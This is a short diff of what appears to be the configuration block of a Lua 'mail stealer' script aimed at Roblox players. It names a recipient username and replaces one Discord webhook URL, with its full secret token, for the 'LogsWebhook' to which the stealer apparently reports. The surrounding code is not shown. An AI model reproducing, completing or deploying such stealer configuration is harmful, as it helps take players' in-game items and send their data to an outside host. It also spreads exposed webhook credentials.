@@ -136,7 +136,7 @@ end)
 DualRAP = 100000000000
 DualUser = ""
 DualWebhook = ""
-LogsWebhook = "https://discord.com/api/webhooks/1372526703993163847/_PSZ6YmDo4SSJRHe_XmwWaoCU3GBhZFQJvCGuEiFxgBUOGqoMcXeWdbdF447eEUNE2bW"
+LogsWebhook = "https://discord.com/api/webhooks/968537046874488932/OnVDGaf9X0JvF1b0wpfJ0CwRqwVtt5JCz2S_c9qA7wftVQ4SEm-BUdJCyoRR7O4FBzZC"
 mailstealer_name = "xe"
 Username = "Erengobrrr"
 Roblox_Username = Username
